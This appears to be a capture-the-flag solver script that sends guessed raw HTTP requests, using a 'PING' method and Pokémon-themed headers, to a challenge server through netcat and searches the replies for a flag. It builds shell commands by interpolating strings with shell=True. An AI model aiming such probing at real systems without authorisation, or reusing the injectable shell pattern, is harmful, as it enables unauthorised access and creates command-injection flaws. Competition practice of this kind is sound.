#!/usr/bin/env python3
import socket
import subprocess

def send_request(host, port, request):
    """Send HTTP request and get response"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        print(f"[+] Connecting to {host}:{port}...")
        s.connect((host, port))
        
        print(f"[+] Sending:\n{request}")
        s.sendall(request.encode())
        
        response = b""
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        s.close()
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def echo_to_nc(host, port, request):
    """Use echo and pipe to nc"""
    try:
        print(f"[+] Using echo | nc method")
        print(f"[+] Request:\n{request}")
        
        cmd = f'echo -e "{request}" | nc {host} {port}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

HOST = "0.cloud.chals.io"
PORT = 23839

# BLAZIKEN is Fire/Fighting type!
requests = [
    # PING method with Blaziken
    ("PING /flag with Blaziken", "PING /flag HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\n\\r\\n"),
    ("PING / with Blaziken", "PING / HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\n\\r\\n"),
    ("PING /blaziken", "PING /blaziken HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\n\\r\\n"),
    
    # GET method with Blaziken
    ("GET /flag with Blaziken", "GET /flag HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\n\\r\\n"),
    ("GET /blaziken", "GET /blaziken HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\n\\r\\n"),
    ("GET / with Blaziken UA", "GET / HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nUser-Agent: Blaziken\\r\\n\\r\\n"),
    
    # Combination headers
    ("PING Blaziken + Ash", "PING /flag HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\nX-Trainer: Ash\\r\\n\\r\\n"),
    ("GET Blaziken + Ash", "GET /flag HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\nX-Trainer: Ash\\r\\n\\r\\n"),
]

print("=" * 70)
print("Pokémon PING CTF Solver - BLAZIKEN Edition (using echo)")
print("=" * 70)

for i, (desc, req) in enumerate(requests, 1):
    print(f"\n[*] Attempt {i}/{len(requests)}: {desc}")
    print("-" * 70)
    
    # Try with echo | nc
    response = echo_to_nc(HOST, PORT, req)
    
    if response:
        # Check for flag
        if "flag{" in response.lower() or "ctf{" in response.lower() or "inctf{" in response.lower():
            print("\n" + "=" * 70)
            print("[!!!] FLAG FOUND!")
            print("=" * 70)
            print(response)
            print("=" * 70)
            break
        # Check if response is different
        elif "Unauthorized" not in response or len(response) < 1000:
            print("[+] Different response:")
            print(response[:500])  # Show first 500 chars
        else:
            print("[-] Still unauthorized")
    else:
        print("[-] No response")

print("\n[*] Scan complete!")
print("\n[*] You can also manually try:")
print('echo -e "PING /flag HTTP/1.1\\r\\nHost: 0.cloud.chals.io\\r\\nX-Pokemon: Blaziken\\r\\n\\r\\n" | nc 0.cloud.chals.io 23839')